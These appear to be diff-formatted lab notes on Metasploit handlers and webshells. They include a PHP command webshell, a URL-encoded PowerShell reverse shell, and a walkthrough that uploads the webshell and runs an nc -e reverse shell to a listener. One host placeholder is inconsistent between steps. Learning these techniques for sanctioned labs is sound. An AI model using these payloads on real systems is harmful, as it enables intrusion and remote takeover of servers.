@@ -124,3 +124,78 @@ Payloads
 * Naming convention : OS/ARCH/PAYLOAD
 * Staged Example : windows/x64/meterpreter_reverse_tcp
 * Stageless Example : linux/x86/shell_reverse_tcp
+
+# Task 10 - Metasploit multi/handler
+Catches reverse shells, required for Metasploit shells
+* To use: msfconsole, use multi/handler
+* Set options
+    * lhost - local interface to listen on, eth0, tun0, etc
+    * lport - port to use for the listener
+    * payload - must match the connecting shell
+* Launch
+    * Foreground: exploit
+    * Background: exploit -j
+* Sessions and Backgrounding
+    * To background your current session type: background
+    * To list background sessions type: sessions
+    * To connect to a background session type: sessions [number]
+
+# Task 11 - WebShells
+A Webshell runs on a web server through a web page via HTML form or another frontend interface
+* Basic PHP Webshell
+    * ```<?php echo "<pre>" . shell_exec($_GET["cmd"]) . "</pre>"; ?>```
+    * Any commands we enter in the URL after ?cmd= will be executed on the host
+* Example URL Encoded PowerShell Reverse Shell
+    * ```powershell%20-c%20%22%24client%20%3D%20New-Object%20System.Net.Sockets.TCPClient%28%27<IP>%27%2C<PORT>%29%3B%24stream%20%3D%20%24client.GetStream%28%29%3B%5Bbyte%5B%5D%5D%24bytes%20%3D%200..65535%7C%25%7B0%7D%3Bwhile%28%28%24i%20%3D%20%24stream.Read%28%24bytes%2C%200%2C%20%24bytes.Length%29%29%20-ne%200%29%7B%3B%24data%20%3D%20%28New-Object%20-TypeName%20System.Text.ASCIIEncoding%29.GetString%28%24bytes%2C0%2C%20%24i%29%3B%24sendback%20%3D%20%28iex%20%24data%202%3E%261%20%7C%20Out-String%20%29%3B%24sendback2%20%3D%20%24sendback%20%2B%20%27PS%20%27%20%2B%20%28pwd%29.Path%20%2B%20%27%3E%20%27%3B%24sendbyte%20%3D%20%28%5Btext.encoding%5D%3A%3AASCII%29.GetBytes%28%24sendback2%29%3B%24stream.Write%28%24sendbyte%2C0%2C%24sendbyte.Length%29%3B%24stream.Flush%28%29%7D%3B%24client.Close%28%29%22```
+    * You still must change the IP and port and encode it properly
+    * Encoder/decoder : https://www.urldecoder.org/
+
+# Task 12 - Next Steps
+Research your target OS fully
+
+# Task 13 - Practice and Examples
+
+* Linux Webshell
+
+    Local listener
+    ```
+    nc -nvlp 9999
+    listening on [any] 9999 ...
+    ```
+    Webshell code
+    ```
+    cat webshell.php
+    <?php echo "<pre>" . shell_exec($_GET["cmd"]) . "</pre>"; ?>
+    ```
+    Upload webshell.php and navigate to the URL
+    ```
+    http://a.b.c.d/uploads/webshell.php
+    ```
+    Test Webshell functionality
+    ```
+    curl http://a.b.c.d/uploads/webshell.php?cmd=ls
+    <pre>webshell.php
+    ```
+    Try getting a shell, establish your nc command
+    ```
+    nc e.f.g.h 9999 -e /bin/bash
+    ```
+    Encode your nc command
+    ```
+    https://www.urlencoder.org/
+
+    The above turns into:
+    nc%20e.f.g.h%209999%20-e%20%2Fbin%2Fbash
+    ```
+    Execute your nc command
+    ```
+    curl http://a.b.c.d/uploads/webshell.php?cmd=nc%20d.e.f.g%209999%20-e%20%2Fbin%2Fbash
+    ```
+    Check your shell
+    ```
+    nc -nvlp 9999
+    listening on [any] 9999 ...
+    connect to [e.f.g.h] from (UNKNOWN) [a.b.c.d] 41982
+    whoami
+    www-data
+    ```
